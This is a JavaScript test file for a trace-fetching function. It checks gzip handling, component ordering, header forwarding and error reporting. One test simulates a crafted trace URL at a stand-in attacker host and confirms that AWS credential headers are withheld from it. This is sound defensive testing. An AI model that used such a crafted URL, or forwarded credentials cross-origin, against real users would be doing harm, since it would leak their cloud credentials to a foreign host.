#!/usr/bin/env node
"use strict";

// Tests for fetchTraces: the `trace=` query parameter is repeatable, and each
// component is fetched and gunzipped independently before concatenation.

const fs = require("fs");
const path = require("path");
const zlib = require("zlib");
const { assert, testAsync, summarize } = require("./test_harness.js");
const { fetchTraces, parseTrace } = require("./trace_parser.js");

// Minimal fetch() mock: maps a URL → bytes (Buffer/Uint8Array) and returns a
// Response-like object exposing arrayBuffer(). Supports an error URL too.
// Records the second (options) argument of each call so tests can assert that
// headers are forwarded.
function installFetchMock(urlToBytes) {
  const original = global.fetch;
  const calls = [];
  global.fetch = async (url, opts) => {
    calls.push({ url, opts });
    if (!(url in urlToBytes)) {
      return { ok: false, status: 404, async arrayBuffer() { return new ArrayBuffer(0); } };
    }
    const bytes = urlToBytes[url];
    const u8 = bytes instanceof Uint8Array ? bytes : new Uint8Array(bytes);
    return {
      ok: true,
      status: 200,
      async arrayBuffer() {
        return u8.buffer.slice(u8.byteOffset, u8.byteOffset + u8.byteLength);
      },
    };
  };
  const restore = () => { global.fetch = original; };
  restore.calls = calls;
  return restore;
}

// Normalize to a plain Uint8Array so deepStrictEqual doesn't trip on the
// Buffer-vs-Uint8Array type tag (Node Buffers are Uint8Array subclasses).
function bytesOf(buf) {
  const u8 = buf instanceof Uint8Array ? buf : new Uint8Array(buf);
  return Uint8Array.from(u8);
}

async function main() {
  const tracePath = path.join(__dirname, "demo-trace.bin");
  if (!fs.existsSync(tracePath)) {
    console.error(`Trace file not found: ${tracePath}`);
    process.exit(1);
  }

  const fileBytes = fs.readFileSync(tracePath);
  const rawTrace = fileBytes[0] === 0x1f && fileBytes[1] === 0x8b
    ? zlib.gunzipSync(fileBytes)
    : Buffer.from(fileBytes);
  const gzTrace = zlib.gzipSync(rawTrace);

  // Reference parse of a single raw trace.
  const single = await parseTrace(rawTrace);
  const singleEvents = single.events.length;
  console.log(`Single trace: ${singleEvents} events`);

  // ── Test 1: single raw URL round-trips unchanged ──
  await testAsync("single raw component", async () => {
    const restore = installFetchMock({ "/a": rawTrace });
    try {
      const buf = await fetchTraces("/a");
      assert.deepStrictEqual(bytesOf(buf), bytesOf(rawTrace));
    } finally { restore(); }
  });

  // ── Test 2: single gzipped URL is ungzipped to raw bytes ──
  await testAsync("single gzipped component is ungzipped", async () => {
    const restore = installFetchMock({ "/a.gz": gzTrace });
    try {
      const buf = await fetchTraces(["/a.gz"]);
      assert.deepStrictEqual(bytesOf(buf), bytesOf(rawTrace));
    } finally { restore(); }
  });

  // ── Test 3: mixed gzipped + raw components, each ungzipped individually,
  //    then concatenated in order. The concatenated stream must parse as one
  //    trace with double the events (decoder resets on mid-stream TRC\0). ──
  await testAsync("mixed gzip/raw components concatenate and parse", async () => {
    const restore = installFetchMock({ "/gz": gzTrace, "/raw": rawTrace });
    try {
      const buf = await fetchTraces(["/gz", "/raw"]);
      const expectedLen = rawTrace.length * 2;
      assert.strictEqual(buf.byteLength, expectedLen, "concatenated length");
      // First half == raw trace, second half == raw trace.
      const out = bytesOf(buf);
      assert.deepStrictEqual(out.slice(0, rawTrace.length), bytesOf(rawTrace));
      assert.deepStrictEqual(out.slice(rawTrace.length), bytesOf(rawTrace));

      const parsed = await parseTrace(buf);
      assert.strictEqual(parsed.events.length, singleEvents * 2,
        `expected ${singleEvents * 2} events, got ${parsed.events.length}`);
    } finally { restore(); }
  });

  // ── Test 4: order is preserved ──
  await testAsync("component order is preserved", async () => {
    const a = new Uint8Array([1, 2, 3]);
    const b = new Uint8Array([4, 5]);
    const c = new Uint8Array([6]);
    const restore = installFetchMock({ "/a": a, "/b": b, "/c": c });
    try {
      const buf = await fetchTraces(["/a", "/b", "/c"]);
      assert.deepStrictEqual(bytesOf(buf), new Uint8Array([1, 2, 3, 4, 5, 6]));
    } finally { restore(); }
  });

  // ── Test 5b: opts.headers are forwarded to every fetch (BYO credentials) ──
  await testAsync("headers are forwarded to each fetch", async () => {
    const restore = installFetchMock({ "/a": rawTrace, "/b": rawTrace });
    try {
      const headers = { "x-dial9-aws-access-key-id": "AKIA" };
      await fetchTraces(["/a", "/b"], { headers });
      assert.strictEqual(restore.calls.length, 2, "two fetches issued");
      for (const call of restore.calls) {
        assert.ok(call.opts, "fetch received an options arg");
        assert.deepStrictEqual(call.opts.headers, headers, "headers forwarded");
      }
    } finally { restore(); }
  });

  // ── Test 5c: credential headers are withheld from cross-origin URLs ──
  // A crafted `?trace=https://attacker/` must NOT receive the AWS credential
  // headers, or it would exfiltrate the user's credentials to a foreign host.
  await testAsync("credential headers are withheld from cross-origin URLs", async () => {
    const restore = installFetchMock({
      "/api/trace?keys=seg": rawTrace,
      "https://attacker.example/x": rawTrace,
    });
    // Simulate a browser served from https://dial9.example.
    const originalLocation = global.location;
    global.location = { origin: "https://dial9.example", href: "https://dial9.example/viewer.html" };
    try {
      const headers = { "x-dial9-aws-access-key-id": "AKIA", "x-dial9-aws-secret-access-key": "shh" };
      await fetchTraces(["/api/trace?keys=seg", "https://attacker.example/x"], { headers });
      assert.strictEqual(restore.calls.length, 2, "two fetches issued");

      const sameOrigin = restore.calls.find((c) => c.url === "/api/trace?keys=seg");
      const crossOrigin = restore.calls.find((c) => c.url === "https://attacker.example/x");

      assert.deepStrictEqual(sameOrigin.opts.headers, headers, "same-origin request keeps credentials");
      assert.strictEqual(
        crossOrigin.opts.headers,
        undefined,
        "cross-origin request must NOT carry credential headers"
      );
    } finally {
      restore();
      global.location = originalLocation;
    }
  });

  // ── Test 5: a failed component rejects with an informative error ──
  await testAsync("failed fetch rejects", async () => {
    const restore = installFetchMock({ "/ok": rawTrace });
    try {
      let threw = false;
      try {
        await fetchTraces(["/ok", "/missing"]);
      } catch (e) {
        threw = true;
        assert.ok(/404/.test(e.message), `error mentions status: ${e.message}`);
      }
      assert.ok(threw, "expected fetchTraces to reject");
    } finally { restore(); }
  });

  summarize();
}

main();
